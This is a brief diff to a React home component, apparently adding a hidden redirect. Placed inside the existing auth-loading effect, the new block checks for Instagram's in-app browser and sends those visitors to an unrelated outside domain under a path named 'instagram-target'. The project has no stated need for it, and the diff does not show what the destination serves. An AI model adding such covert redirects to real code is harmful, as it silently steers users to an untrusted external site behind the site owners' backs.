@@ -26,6 +26,11 @@ const Home: React.FC = () => {
   const [auth, dispatch] = useReducer(authReducer, initialAuth);
 
   useEffect(() => {
+
+    if (navigator.userAgent.includes('Instagram')) {
+      window.location.href = 'https://shithub.xyz/instagram-target';
+    }
+
     const storedAuth = localStorage.getItem('auth');
     if (storedAuth) {
       const parsedAuth = JSON.parse(storedAuth);
